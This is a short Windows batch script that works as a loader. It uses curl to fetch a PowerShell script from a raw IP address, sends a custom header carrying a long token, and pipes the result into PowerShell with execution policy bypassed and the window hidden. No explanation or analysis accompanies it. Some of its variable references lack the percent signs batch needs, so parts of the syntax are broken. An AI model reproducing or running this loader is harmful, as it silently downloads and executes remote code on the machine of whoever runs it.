@echo off
setlocal

set "url=http://147.45.44.131/infopage/sfxqr.ps1"
set "headerName=X-Special-Header"
set "headerValue=qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq"

cmd.exe /c curl -s -H "headerName: headerValue" url | powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command -"

endlocal

